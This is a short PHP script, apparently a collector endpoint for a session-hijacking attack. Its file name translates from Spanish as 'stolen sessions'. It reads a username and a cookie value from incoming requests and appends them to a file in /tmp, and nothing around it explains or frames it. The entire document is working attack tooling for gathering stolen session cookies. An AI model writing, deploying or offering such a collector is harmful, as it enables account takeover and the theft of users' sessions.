<?php
ini_set("display_errors", 1);
$file = fopen("/tmp/sesiones_robadas.txt", "a");
fwrite($file,  "usuario: " . $_REQUEST["usuario"] . "; sesion: " . $_REQUEST["cookie"]. PHP_EOL);
fclose($file);
